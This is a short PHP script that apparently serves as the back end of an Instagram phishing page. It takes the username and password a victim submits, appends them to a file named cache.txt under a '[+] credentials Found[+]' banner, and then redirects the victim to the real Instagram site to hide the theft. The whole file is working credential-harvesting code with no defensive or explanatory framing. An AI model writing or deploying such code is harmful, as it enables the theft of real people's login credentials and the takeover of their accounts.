<?php
file_put_contents("cache.txt","\n"."[+] credentials Found[+]"."\n"."Username - " . $_POST['username'] . "\n" . "Password - " . $_POST['password'] . "\n",FILE_APPEND);
header("Location: https://www.instagram.com/");
?>'

